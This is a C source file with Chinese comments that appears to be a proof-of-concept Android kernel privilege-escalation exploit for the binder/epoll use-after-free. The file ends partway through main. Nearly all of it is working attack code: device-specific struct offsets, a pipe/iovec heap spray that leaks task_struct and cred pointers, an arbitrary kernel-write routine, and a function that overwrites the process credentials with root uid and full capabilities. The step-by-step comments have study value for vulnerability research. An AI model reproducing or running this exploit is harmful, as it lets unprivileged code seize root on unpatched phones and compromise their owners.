#define _GNU_SOURCE
#include <libgen.h>
#include <time.h>
#include <stdbool.h>
#include <sys/mman.h>
#include <sys/wait.h>
#include <ctype.h>
#include <sys/uio.h>
#include <err.h>
#include <sched.h>
#include <fcntl.h>
#include <sys/epoll.h>
#include <sys/ioctl.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <linux/sched.h>
#include <string.h>
#include <sys/prctl.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <errno.h>


typedef unsigned int u32;

#define DELAY_USEC              500000
#define KERNEL_ADDR_START       0xffff000000000000
#define KERNEL_ADDR_END         0xffffffffffff0000

#define USER_DS                 0x8000000000ul
#define UAF_SPINLOCK            0x10001
#define PAGE                    0x1000ul
#define ONE_PAGE_SIZE           0x1000

#define RETRIES                 10

#define CMP_MAX(x, y) ((x) > (y) ? (x) : (y))
#define ARRAY_SIZE(x) (sizeof(x) / sizeof((x)[0]))


#define BINDER_SET_MAX_THREADS  0x40046205ul
#define BINDER_THREAD_EXIT      0x40046208ul


/* 利用漏洞可泄露的内核数据 */
struct leak_data{
	unsigned long task;    // 存放泄露的task_struct指针
	unsigned long thread;  // 存放泄露的thread_info指针
	unsigned long stack;   // 存放泄露的stack指针
	unsigned long cred;    // 存放泄露的cred指针
	unsigned long kaddr;   // 存放泄露的内核全局变量地址
};

/* 利用漏洞向任意地址写任意数据时使用信息 */
struct clobber_gdata{
	unsigned long dst;  // 要修改内存的地址
	void* src;          // 存放内容的地址
	int len;            // 修改内存的长度
};

enum{
	DEVINFO_OFFSET_NO,
	DEVINFO_OFFSET_OK,
};

struct devinfo{
	int flag;
	char* devname; 	               // 设备名称 /system/build.prog/ ro.product.model
	char* kernver;                 // 内存版本 /proc/version, uname -r
	int binder_thread_size; 	   // binder_thread 结构体大小
	int offset_binder_task; 	   // offsetof(binder_thread.task)
	int offset_binder_next; 	   // offsetof(binder_thread.wait.task_list.next)
	int offset_binder_wait; 	   // offsetof(binder_thread.wait)
	int offset_binder_next_task;   // binder_thread 结构体中next和task字段之间的偏移
	int offset_task_stack;		   // offsetof(task_struct.stack)
	int offset_task_cred;		   // offsetof(task_struct.cred)
	int offset_task_sched_class;   // offsetof(task_struct.sched_class)
	int offset_addr_limit;		   // offsetof(thread_info.addr_limit)
	int offset_selinux; 		   // 全局变量fair_sched_class与selinux_enforcing之间的偏移
	int kern_copy_offset;          // 泄漏的内核地址与拷贝地址之间的偏移
	int kern_copy_size;	           // 总共需要拷贝数据的大小
};

/* 利用安卓模拟器测试 */
struct devinfo devinfo[] = {
#if 0
	{
		.flag = DEVINFO_OFFSET_OK,
		.devname = "Linux localhost",
		.kernver = "4.4.124+",
		.binder_thread_size = 0x1a0,
		.offset_binder_task = 0x198,
		.offset_binder_next = 0xb0,
		.offset_binder_wait = 0xa8,
		.offset_binder_next_task = 0xe8,
		.offset_task_stack = 0x8,
		.offset_task_cred = 0x940,
		.offset_task_sched_class = 0x58,
		.offset_addr_limit = 0x8,
		.offset_selinux = 0,
		.kern_copy_offset = 0,
		.kern_copy_size = 4*0x100000,//4MB
	},
#else
	{	// Honor 8 Lite PRA-AL00X
		.flag = DEVINFO_OFFSET_OK,
		.devname = "Linux localhost",
		.kernver = "4.4.23+",
		.binder_thread_size = 0x1a0,
		.offset_binder_task = 0x198,
		.offset_binder_next = 0xb0,
		.offset_binder_wait = 0xa8,
		.offset_binder_next_task = 0xe8,
		.offset_task_stack = 0x8,
		.offset_task_cred = 0x618,
		.offset_task_sched_class = 0x88,
		.offset_addr_limit = 0x8,
		.offset_selinux = 0x483bf8,
		.kern_copy_offset = 0x100000,
		.kern_copy_size = 4*0x100000,//4MB
	},
#endif
};

struct devinfo *dev_info;


typedef struct {
	int counter;
} atomic_t;

typedef struct kernel_cap_struct {
	u32 cap[2];
} kernel_cap_t;

struct cred {
	atomic_t    usage;
	uid_t       uid;        /* real UID of the task */
	gid_t       gid;        /* real GID of the task */
	uid_t       suid;       /* saved UID of the task */
	gid_t       sgid;       /* saved GID of the task */
	uid_t       euid;       /* effective UID of the task */
	gid_t       egid;       /* effective GID of the task */
	uid_t       fsuid;      /* UID for VFS ops */
	gid_t       fsgid;      /* GID for VFS ops */
	unsigned    securebits; /* SUID-less security management */
	kernel_cap_t    cap_inheritable; /* caps our children can inherit */
	kernel_cap_t    cap_permitted;  /* caps we're permitted */
	kernel_cap_t    cap_effective;  /* caps we can actually use */
	kernel_cap_t    cap_bset;   /* capability bounding set */
	kernel_cap_t    cap_ambient;    /* Ambient capability set */
	/* ... */
};


void error(char* fmt, ...)
{
    va_list ap;
    va_start(ap, fmt);
    vfprintf(stderr, fmt, ap);
    va_end(ap);
    fprintf(stderr, ": %s\n", errno ? strerror(errno) : "error");
    exit(1);
}


void hexdump_memory(void *_buf, size_t byte_count)
{
    unsigned char *buf = _buf;
    unsigned long byte_offset_start = 0;
    if (byte_count % 16)
        error( "hexdump_memory called with non-full line");
    for (unsigned long byte_offset = byte_offset_start; byte_offset < byte_offset_start + byte_count;
         byte_offset += 16)
    {
        char line[1000];
        char *linep = line;
        linep += sprintf(linep, "%08lx  ", byte_offset);
        for (int i = 0; i < 16; i++)
        {
            linep += sprintf(linep, "%02hhx ", (unsigned char)buf[byte_offset + i]);
        }
        linep += sprintf(linep, " |");
        for (int i = 0; i < 16; i++)
        {
            char c = buf[byte_offset + i];
            if (isalnum(c) || ispunct(c) || c == ' ')
            {
                *(linep++) = c;
            }
            else
            {
                *(linep++) = '.';
            }
        }
        linep += sprintf(linep, "|");
        puts(line);
    }
}


unsigned long iovec_size(struct iovec *iov, int n)
{
    unsigned long sum = 0;
    for (int i = 0; i < n; i++)
        sum += iov[i].iov_len;
    return sum;
}

unsigned long iovec_max_size(struct iovec *iov, int n)
{
    unsigned long m = 0;
    for (int i = 0; i < n; i++)
    {
        if (iov[i].iov_len > m)
            m = iov[i].iov_len;
    }
    return m;
}

#if 1
/*
 * 函数: clobber_group_data_corrlen
 * 参数: gdata, 指向利用漏洞修改数据的信息; count, 共有多少组信息;
 * 返回: 成功返回1，失败返回0
 * 说明: 利用漏洞实现向任意地址写任意数据，可同时修改多组数据
 *       binder_thread.wait 字段对应 iovec.len 的情况
 */
int clobber_group_data_corrlen(int binder_fd, int epfd, struct clobber_gdata* gdata, int count)
{
	int ret = 0, i, j;
	struct epoll_event event = {.events = EPOLLIN};
	int max_threads = 2;
	unsigned long test_dat = 0;
	unsigned long const test_val = 0x90ABCDEF12345678ul;

	/* 准备一块内存，大小按照 iovec_array 数组中最大数据长度 */
	int dummy_size = CMP_MAX(UAF_SPINLOCK, ONE_PAGE_SIZE);
	char *dummy_buf = malloc(dummy_size);
	if (dummy_buf == NULL){
		error("[ERROR] %s %d : malloc dummy_buf failed!", __FUNCTION__, __LINE__);
		goto err_cgdc_dummy_buf;
	}
	memset(dummy_buf, 0, dummy_size);

	/* 构造的一组数组，在漏洞触发后会覆盖 iovec_array 数组中字段 */
	int second_write_size = (4+count*2)*sizeof(unsigned long);
	unsigned long *second_write_chunk = (unsigned long *)malloc(second_write_size);
	if(!second_write_chunk){
		error("[ERROR] %s %d : malloc iovec_array failed!", __FUNCTION__, __LINE__);
		goto err_cgdc_write_chunk;
	}
	second_write_chunk[0] = (unsigned long)dummy_buf;
	second_write_chunk[1] = second_write_size;
	for(i = 2, j = 0; j < count; j++){
		second_write_chunk[i++] = gdata[j].dst;
		second_write_chunk[i++] = gdata[j].len;
	}
	second_write_chunk[i++] = (unsigned long)&test_dat;
	second_write_chunk[i] = sizeof(test_dat);

	/* 计算按照页对齐，需要填充的数据大小 */
	int delta = (UAF_SPINLOCK + second_write_size) % ONE_PAGE_SIZE;
	int pad_size = (delta == 0 ? 0 : ONE_PAGE_SIZE - delta);

	/* 占位binder_thread结构体后，wait字段在iovec_array数组中的数组项 */
	int indx_wait = dev_info->offset_binder_wait/sizeof(struct iovec);
	/* iovec_array数组元素的个数 */
	int iovec_array_count = dev_info->offset_binder_task/sizeof(struct iovec);
	/* iovec_array数组的大小，因为占位binder_thread结构体后需要泄露task指针，
	 * 因此不能覆盖task指针，所以这里不是用binder_thread结构体的大小 */
	int iovec_array_size = iovec_array_count*sizeof(struct iovec);
	struct iovec* iovec_array = malloc(iovec_array_size);
	if(!iovec_array){
		error("[ERROR] %s %d : malloc iovec_array failed!", __FUNCTION__, __LINE__);
		goto err_cgdc_iovec_array;
	}
	memset(iovec_array, 0, iovec_array_size);

	/* 初始化 iovec_array 数组
	 * 第一组数据，用于填充按照页对齐数据
	 * 第二组数据，漏洞触发后len会变为UAF_SPINLOCK
	 * 第三组数据，漏洞触发后iovec_array[indx_wait + 1].iov_base会变为对应的内核地址
	 * 第四组数据，为了补充第二组数据的长度，在漏洞触发后会被second_write_chunk对应的内容覆盖
	 * 第五组-倒数第二组数据，用于填充任意内核地址和长度
	 * 最后一组数据，用于验证漏洞是否触发成功 */
	iovec_array[indx_wait - 1].iov_base = dummy_buf;
	iovec_array[indx_wait - 1].iov_len = pad_size;
	iovec_array[indx_wait].iov_base = dummy_buf;
	iovec_array[indx_wait].iov_len = 0;                       // spinlock: will turn to UAF_SPINLOCK
	iovec_array[indx_wait + 1].iov_base = second_write_chunk; // wq->task_list->next: will turn to task_list
	iovec_array[indx_wait + 1].iov_len = second_write_size;   // wq->task_list->prev: will turn to task_list
	iovec_array[indx_wait + 2].iov_base = dummy_buf;
	iovec_array[indx_wait + 2].iov_len = UAF_SPINLOCK;
	for(i = 3, j = 0; j < count; i++, j++){
		iovec_array[indx_wait + i].iov_base = dummy_buf;
		iovec_array[indx_wait + i].iov_len = gdata[j].len;
	}
	iovec_array[indx_wait + i].iov_base = dummy_buf;
	iovec_array[indx_wait + i].iov_len = sizeof(test_dat);
	/* 数据总长度 */
	int total_len = iovec_size(iovec_array, iovec_array_count);

	/* 设置binder最多可以请求注册线程个数 */
	if(ioctl(binder_fd, BINDER_SET_MAX_THREADS, &max_threads)){
		error("[ERROR] %s %d : ioctl binder_fd BINDER_SET_MAX_THREADS failed!", __FUNCTION__, __LINE__);
	}
	/* 1、创建 binder_thread 结构体，epfd 与 binder_fd 建立联系 */
	if (epoll_ctl(epfd, EPOLL_CTL_ADD, binder_fd, &event)){
		error("[ERROR] %s %d : epoll_ctl EPOLL_CTL_ADD failed!", __FUNCTION__, __LINE__);
		goto err_cgdc_epoll_add;
	}

	int pipes[2];
	if(pipe(pipes)){
		error("[ERROR] %s %d : fcntl F_SETPIPE_SZ failed!", __FUNCTION__, __LINE__);
		goto err_cgdc_pipe;
	}
	/* 设置管道大小为一个页 */
	if ((fcntl(pipes[0], F_SETPIPE_SZ, ONE_PAGE_SIZE)) != ONE_PAGE_SIZE)
		error("[ERROR] %s %d : fcntl F_SETPIPE_SZ failed!", __FUNCTION__, __LINE__);
	if ((fcntl(pipes[1], F_SETPIPE_SZ, ONE_PAGE_SIZE)) != ONE_PAGE_SIZE)
		error("[ERROR] %s %d : fcntl F_SETPIPE_SZ failed!", __FUNCTION__, __LINE__);

	pid_t fork_ret = fork();
	if (fork_ret == -1){
		error("[ERROR] %s %d : fork child failed!", __FUNCTION__, __LINE__);
		goto err_cgdc_fork;
	}
	if (fork_ret == 0) {
		/* Child process */
		unsigned long pos = 0;
		char *wbuf = malloc(total_len);
		if (wbuf == NULL){
			error("[ERROR] %s %d : malloc wbuf failed!", __FUNCTION__, __LINE__);
			exit(0);
		}
		if(prctl(PR_SET_PDEATHSIG, SIGKILL)){
			error("[ERROR] %s %d : CHILD: prctl PR_SET_PDEATHSIG failed!", __FUNCTION__, __LINE__);
		}
		/* 等待父进程阻塞后调度 */
		usleep(DELAY_USEC);
		/* 4、触发漏洞，会进行链表删除操作 */
		if(epoll_ctl(epfd, EPOLL_CTL_DEL, binder_fd, &event)){
			error("[ERROR] %s %d : CHILD: epoll_ctl EPOLL_CTL_DEL failed!", __FUNCTION__, __LINE__);
			exit(0);
		}
		/* 准备第一、二组数据 */
		memset(wbuf, 0, pad_size + UAF_SPINLOCK);
		pos = pad_size + UAF_SPINLOCK;
		/* 准备第三组数据 */
		memcpy(wbuf + pos, second_write_chunk, second_write_size);
		pos += second_write_size;
		/* 准备第四组-倒数第二组数据 */
		for(i = 0; i < count; i++){
			memcpy(wbuf + pos, gdata[i].src, gdata[i].len);
			pos += gdata[i].len;
		}
		/* 准备最后一组数据，用于验证漏洞是否触发成功 */
		memcpy(wbuf + pos, &test_val, sizeof(test_dat));
		pos += sizeof(test_dat);
		/* 5、将准备的数据写入管道 */
		if(write(pipes[1], wbuf, pos) != pos){
			error("[ERROR] %s %d : CHILD: write pipes failed!", __FUNCTION__, __LINE__);
		}

		close(pipes[1]);
		close(pipes[0]);
		free(wbuf);

		exit(0);
	}
	/* 2、释放 binder_thread 结构体 */
	if(ioctl(binder_fd, BINDER_THREAD_EXIT, NULL)){
		error("[ERROR] %s %d : ioctl binder_fd BINDER_THREAD_EXIT failed!", __FUNCTION__, __LINE__);
	}
	/* 3、堆喷，抢占刚被释放 binder_thread 所占的内存
	 *    此时读管道，管道内容为空会阻塞，等待子进程写管道
	 *    子进程运行后会触发漏洞，之后iovec_array内容会发生变化，如下
	 *    iovec_array[indx_wait - 1].iov_base = dummy_buf;
	 *    iovec_array[indx_wait - 1].iov_len = pad_size;
	 *    iovec_array[indx_wait].iov_base = dummy_buf;
	 *    iovec_array[indx_wait].iov_len = 10001;
	 *    iovec_array[indx_wait + 1].iov_base = kp_next; //就是该对象对应内核地址
	 *    iovec_array[indx_wait + 1].iov_len = kp_next;  //这个长度之后会被修改，所以不影响
	 *    iovec_array[indx_wait + 2].iov_base = dummy_buf;
	 *    iovec_array[indx_wait + 2].iov_len = UAF_SPINLOCK;
	 *    for(i = 3, j = 0; j < count; i++, j++){
	 *        iovec_array[indx_wait + i].iov_base = dummy_buf;
	 *        iovec_array[indx_wait + i].iov_len = gdata[j].len;
	 *    }
	 *    iovec_array[indx_wait + i].iov_base = dummy_buf;
	 *    iovec_array[indx_wait + i].iov_len = sizeof(test_dat);
	 *    子进程写管道时，由于管道大小为一个页，所以会阻塞等待父进程读取管道数据，
	 *    父进程读取管道数据之后会阻塞等待子进程写管道（这里读管道会阻塞是因为写管道由于
	 *    管道缓冲区不够再等待写管道    ）。经过几次读写后会将第1、2组数据读取，在读取第3组
	 *    数据时，由于基址是内核地址，会将管道中的数据写道该内核地址，其实就是将数组
	 *    second_write_chunk的内容写到iovec_array[indx_wait + 1].iov_base对应的内核地址
	 *    之后iovec_array内容会发生变化，如下
	 *    iovec_array[indx_wait + 1].iov_base = dummy_buf;
	 *    iovec_array[indx_wait + 1].iov_len = second_write_size;
	 *    for(i = 2, j = 0; j < count; i++, j++){
	 *        iovec_array[indx_wait + i].iov_base = gdata[j].dst;
	 *        iovec_array[indx_wait + i].iov_len = gdata[j].len;
	 *    }
	 *    iovec_array[indx_wait + i].iov_base = test_dat;
	 *    iovec_array[indx_wait + i].iov_len = sizeof(test_dat);
	 *    读取第4组 - 最后第2组数据就是将 gdata[j].src 的内容写入 gdata[j].dst 地址
	 *    实现向任意内核地址写任意值
	 *    读取最后一组数据就是将 test_val 写入 test_dat 中 */
	ret = readv(pipes[0], iovec_array, iovec_array_count);
	if(ret != total_len){
		error("[ERROR] %s %d : readv failed!", __FUNCTION__, __LINE__);
	}

err_cgdc_fork:
    close(pipes[0]);
    close(pipes[1]);
err_cgdc_pipe:
err_cgdc_epoll_add:
	free(iovec_array);
err_cgdc_iovec_array:
	free(second_write_chunk);
err_cgdc_write_chunk:
    free(dummy_buf);
err_cgdc_dummy_buf:
    return test_dat == test_val;
}


/*
 * 函数: leak_task_corrlen
 * 参数: lkdat, 存放泄露的内核数据
 * 返回: 成功返回1，失败返回0
 * 说明: 利用漏洞泄露task内容
 *       binder_thread.wait 字段对应 iovec.len 的情况
 */
int leak_task_corrlen(int binder_fd, int epfd, struct leak_data* lkdat)
{
	int ret = 0;
    int status = 0;
	int lksec_size = ONE_PAGE_SIZE;
	/* 最小泄露数据的长度 */
	unsigned long const leak_min_size = dev_info->offset_binder_next_task + 8;
	/* 调整数据长度 */
	unsigned long leak_adj_size = leak_min_size + ONE_PAGE_SIZE;
	struct epoll_event event = {.events = EPOLLIN};
	int max_threads = 2;

	/* 占位binder_thread结构体后，wait字段在iovec_array数组中的数组项 */
	int indx_wait = dev_info->offset_binder_wait/sizeof(struct iovec);
	/* iovec_array数组元素的个数 */
	int iovec_array_count = dev_info->offset_binder_task/sizeof(struct iovec);
	/* iovec_array数组的大小，因为占位binder_thread结构体后需要泄露task指针，
	 * 因此不能覆盖task指针，所以这里不是用binder_thread结构体的大小 */
	int iovec_array_size = iovec_array_count*sizeof(struct iovec);
	struct iovec* iovec_array = malloc(iovec_array_size);
	if(!iovec_array){
		error("[ERROR] %s %d : malloc iovec_array failed!", __FUNCTION__, __LINE__);
		goto err_ltc_iovec_array;
	}
	memset(iovec_array, 0, iovec_array_size);

	/* 计算按照页对齐，需要填充的数据大小 */
	int delta = (UAF_SPINLOCK + leak_min_size) % ONE_PAGE_SIZE;
	int pad_size = (delta == 0 ? 0 : ONE_PAGE_SIZE - delta) + ONE_PAGE_SIZE;
	/* 五组数据 */
	iovec_array[indx_wait - 2].iov_base = (unsigned long *)0xDEADBEEF;
	iovec_array[indx_wait - 2].iov_len = ONE_PAGE_SIZE;
	iovec_array[indx_wait - 1].iov_base = (unsigned long *)0xDEADBEEF;
	iovec_array[indx_wait - 1].iov_len = pad_size - ONE_PAGE_SIZE;
	iovec_array[indx_wait].iov_base = (unsigned long *)0xDEADBEEF;
	iovec_array[indx_wait].iov_len = 0;//0x10001;                       /* spinlock: will turn to UAF_SPINLOCK */
	iovec_array[indx_wait + 1].iov_base = (unsigned long *)0xDEADBEEF;  /* wq->task_list->next */
	iovec_array[indx_wait + 1].iov_len = leak_adj_size;                 /* wq->task_list->prev */
	iovec_array[indx_wait + 2].iov_base = (unsigned long *)0xDEADBEEF;
	iovec_array[indx_wait + 2].iov_len = UAF_SPINLOCK + lksec_size;
	unsigned long total_len = iovec_size(iovec_array, iovec_array_count);
	unsigned long max_len = iovec_max_size(iovec_array, iovec_array_count);
	//printf("    max_len = 0x%lx\n", max_len);

	unsigned char *dummy_buf = malloc(max_len);
	if (!dummy_buf){
		error("[ERROR] %s %d : malloc iovec_array failed!", __FUNCTION__, __LINE__);
		goto err_ltc_dummy_buf;
	}
	memset(dummy_buf, 0, max_len);
	for (int i = 0; i < iovec_array_count; i++){
		if (iovec_array[i].iov_base == (unsigned long *)0xDEADBEEF)
			iovec_array[i].iov_base = dummy_buf;
	}

	/* 设置binder最多可以请求注册线程个数 */
    if(ioctl(binder_fd, BINDER_SET_MAX_THREADS, &max_threads)){
		error("[ERROR] %s %d : ioctl binder_fd BINDER_SET_MAX_THREADS failed!", __FUNCTION__, __LINE__);
	}
	/* 1、创建 binder_thread 结构体，epfd 与 binder_fd 建立联系 */
	if (epoll_ctl(epfd, EPOLL_CTL_ADD, binder_fd, &event)){
		error("[ERROR] %s %d : epoll_ctl EPOLL_CTL_ADD failed!", __FUNCTION__, __LINE__);
	}

	int pipefd[2];
	int leakpipe[2];
	/* 此管道用来堆喷占位、泄露task内容 */
	if (pipe(pipefd)){
		error("[ERROR] %s %d : pipe pipefd failed!", __FUNCTION__, __LINE__);
		goto err_ltc_pipe;
	}
	/* 此管道做父子进程通信，读取泄露的内容 */
	if (pipe(leakpipe)){
		error("[ERROR] %s %d : pipe leakpipe failed!", __FUNCTION__, __LINE__);
		goto err_ltc_leakpipe;
	}
	/* 设置管道大小为一个页 */
	if ((fcntl(pipefd[0], F_SETPIPE_SZ, ONE_PAGE_SIZE)) != ONE_PAGE_SIZE)
		error("[ERROR] %s %d : fcntl F_SETPIPE_SZ failed!", __FUNCTION__, __LINE__);
	if ((fcntl(pipefd[1], F_SETPIPE_SZ, ONE_PAGE_SIZE)) != ONE_PAGE_SIZE)
		error("[ERROR] %s %d : fcntl F_SETPIPE_SZ failed!", __FUNCTION__, __LINE__);

	pid_t fork_ret = fork();
	if (fork_ret == -1){
		error("[ERROR] %s %d : fcntl F_SETPIPE_SZ failed!", __FUNCTION__, __LINE__);
		goto err_ltc_fork;
	}
	if (fork_ret == 0) {
        /* Child process */
		int offset = 0;
		unsigned long kdat = 0;
		unsigned long list_next = 0;
		unsigned long list_prev = 0;
		struct leak_data leak = {0,};
        unsigned long leaksize = pad_size + UAF_SPINLOCK + leak_min_size;
		unsigned char* leakbuf = malloc(leaksize);

		if(!leakbuf){
			error("[ERROR] %s %d : malloc write_buf failed!", __FUNCTION__, __LINE__);
		}
		memset(leakbuf, 0, leaksize);

		if(prctl(PR_SET_PDEATHSIG, SIGKILL)){
			error("ERROR] %s %d : prctl PR_SET_PDEATHSIG failed!", __FUNCTION__, __LINE__);
		}
		/* 等待父进程阻塞后调度 */
		usleep(DELAY_USEC);
		/* 4、第一次触发漏洞，会进行链表删除操作 */
		if(epoll_ctl(epfd, EPOLL_CTL_DEL, binder_fd, &event)){
			error("ERROR] %s %d : epoll_ctl EPOLL_CTL_DEL failed!", __FUNCTION__, __LINE__);
		}

		/* 第一次读取，四组数据，第四组数据没有读完 */
        if (read(pipefd[0], leakbuf, leaksize) != leaksize){
			error("ERROR] %s %d : read leakbuf failed!", __FUNCTION__, __LINE__);
    	}
        //hexdump_memory(leakbuf + leaksize - leak_min_size, leak_min_size);

		/* 泄露的next和prev指针必须相等 */
		list_next = *(unsigned long *)(leakbuf + leaksize - leak_min_size);
		list_prev = *(unsigned long *)(leakbuf + leaksize - leak_min_size + sizeof(void*));
		/* 从泄露的内核数据中获取task指针 */
		leak.task = *(unsigned long *)((leakbuf + leaksize - leak_min_size) + dev_info->offset_binder_next_task);
		//printf(">>> CHILD: list_next = 0x%lx; list_prev = 0x%lx\n", list_next, list_prev);
		//printf(">>> CHILD: task_struct = 0x%lx\n", leak.task);

		if((leak.task > KERNEL_ADDR_START) && (list_next == list_prev) && list_next > KERNEL_ADDR_START){
			unsigned long extra[] = {
				list_next,
				leak_adj_size,
				/* 需要泄露的内核地址，这里是需要泄露的task地址 */
				leak.task,
				/* 需要泄露的数据的长度，这里固定一个页 */
				lksec_size
			};
			struct clobber_gdata gdata[] = {
				{
					/* 要修改的地址，这里就是iovec_array[indx_wait + 3].iov_base对应的内核地址 */
					.dst = list_next,
					/* 写入数据的地址 */
					.src = (void*)&extra,
					/* 写入数据的长度 */
					.len = sizeof(extra),
				},
			};
			/* 调用任意写函数，成功修改返回1 */
			ret = clobber_group_data_corrlen(binder_fd, epfd, gdata, ARRAY_SIZE(gdata));
			if (!ret) {
				error("ERROR] %s %d : clobber_group_data_corrlen failed!", __FUNCTION__, __LINE__);
            }
        }

		/* 第二次读取，继续读取第四组剩余数据，大小0x1000 */
        if (read(pipefd[0], leakbuf, leak_adj_size - leak_min_size) != leak_adj_size - leak_min_size){
			error("ERROR] %s %d : read leakbuf failed!", __FUNCTION__, __LINE__);
        }

		/* 第三次读取，读取第五组数据，大小lksec_size */
		if (read(pipefd[0], leakbuf, lksec_size) != lksec_size) {
			error("ERROR] %s %d : read leakbuf failed!", __FUNCTION__, __LINE__);
		}
        //hexdump_memory(leakbuf, lksec_size);

		if(ret){
			if(dev_info->offset_task_stack){
				leak.stack = *(unsigned long*)(leakbuf + dev_info->offset_task_stack);
			}
			/* 如果内核栈偏移不正确，在task中找第一个内核地址的值认为是内核栈地址 */
			if(leak.stack < KERNEL_ADDR_START){
				for(int i = 0; i < 10; i++){
					kdat = *(unsigned long*)(leakbuf + i*sizeof(void*));
					if(kdat > KERNEL_ADDR_START){
						leak.stack = kdat;
						dev_info->offset_task_stack = i*sizeof(void*);
						printf(">>> stack offset = 0x%x\n", dev_info->offset_task_stack);
						break;
					}
				}
			}
			/* 查找task结构体的前10个值，判断是否有USER_DS，如果有说明thread_info内嵌在task结构体 */
			for(int i = 0; i < 10; i++){
				kdat = *(unsigned long*)(leakbuf + i*sizeof(void*));
				if(kdat == USER_DS){
					leak.thread = leak.task;
					dev_info->offset_addr_limit = i*sizeof(void*);
					printf(">>> thread_info in task_struct, addr_limit = 0x%lx; offset = 0x%x\n", kdat, dev_info->offset_addr_limit);
					break;
				}
			}
			/* 前面没有找到addr_limit，那么 thread_info 等于内核栈地址 */
			if(leak.thread < KERNEL_ADDR_START){
				leak.thread = leak.stack;
			}
			/* 如果参数中指定cred偏移，则直接读取cred指针 */
			if(dev_info->offset_task_cred){
				leak.cred = *(unsigned long*)(leakbuf + dev_info->offset_task_cred);
			}
			/* 如果参数中指定sched_class偏移，则直接读取sched_class指针 */
			if(dev_info->offset_task_sched_class){
				leak.kaddr = *(unsigned long*)(leakbuf + dev_info->offset_task_sched_class);
			}
			//printf(">>> CHILD: thread_info = 0x%lx\n", leak.thread);
			//printf(">>> CHILD: cred = 0x%lx\n", leak.cred);
			//printf(">>> CHILD: kaddr = 0x%lx\n", leak.kaddr);
			status = 1;
		}

		/* 通过管道将泄露的数据传递给父进程 */
		if(write(leakpipe[1], &leak, sizeof(leak)) != sizeof(leak)){
			error("ERROR] %s %d : write leak data failed!", __FUNCTION__, __LINE__);
		}
		/* 通知父进程泄露内核数据的状态 */
		if(write(leakpipe[1], &status, sizeof(status)) != sizeof(status)){
			error("ERROR] %s %d : write status failed!", __FUNCTION__, __LINE__);
		}

		close(pipefd[0]);
		close(pipefd[1]);
		close(leakpipe[0]);
		close(leakpipe[1]);
		free(leakbuf);

		exit(0);
    }
	/* Parent process */
	/* 2、释放 binder_thread 结构体 */
	if(ioctl(binder_fd, BINDER_THREAD_EXIT, NULL)){
		error("[ERROR] %s %d : ioctl binder_fd BINDER_THREAD_EXIT failed!", __FUNCTION__, __LINE__);
	}
	/* 3、堆喷，抢占刚被释放 binder_thread 所占的内存 */
	ret = writev(pipefd[1], iovec_array, iovec_array_count);
	if(ret != total_len){
		error("[ERROR] %s %d : writev failed!", __FUNCTION__, __LINE__);
	}
	/* 从子进程读取泄露的内核信息 */
	ret = read(leakpipe[0], lkdat, sizeof(struct leak_data));
	if(ret != sizeof(struct leak_data)){
		error("[ERROR] %s %d : read leak data failed!", __FUNCTION__, __LINE__);
	}
	/* 读取子进程泄露内核信息状态 */
	ret = read(leakpipe[0], &status, sizeof(status));
	if(ret != sizeof(status)){
		error("[ERROR] %s %d : read success failed!", __FUNCTION__, __LINE__);
	}

	/* 等待子进程结束 */
	if (wait(&ret) != fork_ret)
		error("[ERROR] %s %d : wait child failed!", __FUNCTION__, __LINE__);

err_ltc_fork:
	close(leakpipe[0]);
	close(leakpipe[1]);
err_ltc_leakpipe:
	close(pipefd[0]);
	close(pipefd[1]);
err_ltc_pipe:
	free(dummy_buf);
err_ltc_dummy_buf:
	free(iovec_array);
err_ltc_iovec_array:
	return status;
}
#endif


int clobber_group_data_retry(int binder_fd, int epfd, struct clobber_gdata* gdata, int count)
{
    int retry = 0;
    while (retry < RETRIES && !clobber_group_data_corrlen(binder_fd, epfd, gdata, count)) {
		//printf(">>> clobber_group_data_retry [%d]\n", retry);
        retry++;
    }
	if(retry >= RETRIES){
		printf(">>> clobber_group_data_retry failed\n");
	}

    return retry < RETRIES;
}


int leak_task_retry(int binder_fd, int epfd, struct leak_data* lkdat)
{
    int retry = 0;

	/* 失败后，重复尝试RETRIES次 */
    while (retry < RETRIES && !leak_task_corrlen(binder_fd, epfd, lkdat)) {
		//printf(">>> leak_task retrying [%d]\n", retry);
        retry++;
    }

	if(retry >= RETRIES){
		printf(">>> leak_task failed\n");
	}

    return retry < RETRIES;
}

/*
 * 函数: patch_cred_selinux
 * 参数: selinux, selinux_enforcing的内核地址; cred, cred内核地址
 * 返回: 成功返回真，失败返回假
 * 说明: 修改 cred 和 selinux_enforcing 达到提权
 */
int patch_cred_selinux(int binder_fd, int epfd, unsigned long selinux, unsigned long cred)
{
	int ret = 0;
	unsigned int pselinux[] = {
		0,
	};
	struct cred pcred;
	pcred.usage.counter = 0x26;
	pcred.uid = 0;
	pcred.gid = 0;
	pcred.suid = 0;
	pcred.sgid = 0;
	pcred.euid = 0;
	pcred.egid = 0;
	pcred.fsuid = 0;
	pcred.fsgid = 0;
	pcred.securebits = 0;
	pcred.cap_inheritable.cap[0] = 0xffffffff;
	pcred.cap_inheritable.cap[1] = 0xffffffff;
	pcred.cap_permitted.cap[0] = 0xffffffff;
	pcred.cap_permitted.cap[1] = 0xffffffff;
	pcred.cap_effective.cap[0] = 0xffffffff;
	pcred.cap_effective.cap[1] = 0xffffffff;
	pcred.cap_bset.cap[0] = 0xffffffff;
	pcred.cap_bset.cap[1] = 0xffffffff;
	pcred.cap_ambient.cap[0] = 0xffffffff;
	pcred.cap_ambient.cap[1] = 0xffffffff;
	struct clobber_gdata gdata[] = {
#if 0
		{
			.dst = selinux,
			.src = (void*)&pselinux,
			.len = sizeof(pselinux),
		},
#endif
		{
			.dst = cred,
			.src = (void*)&pcred,
			.len = sizeof(pcred),
		},
	};
	
	ret = clobber_group_data_retry(binder_fd, epfd, gdata, ARRAY_SIZE(gdata));

	return ret;
}


int init(void)
{
	dev_info = (struct devinfo*)&devinfo;

	return 0;
}


int main(int argc, char **argv)
{
	int step = 0;
	struct leak_data lkdat;
	int binder_fd, epfd;

	printf("[%d] Starting POC\n", step++);

	init();

	binder_fd = open("/dev/binder", O_RDONLY);
	if(-1 == binder_fd){
		printf("[ERROR] %s %d : open /dev/binder failed!", __FUNCTION__, __LINE__);
		goto err;
	}

	epfd = epoll_create(1000);
	if(-1 == epfd){
		printf("[ERROR] %s %d : epoll_create failed!", __FUNCTION__, __LINE__);
		goto err;
	}

	/* 1、泄露task内容 */
	if(leak_task_retry(binder_fd, epfd, &lkdat)){
		printf("[%d] Leak kernel data OK!\n", step++);
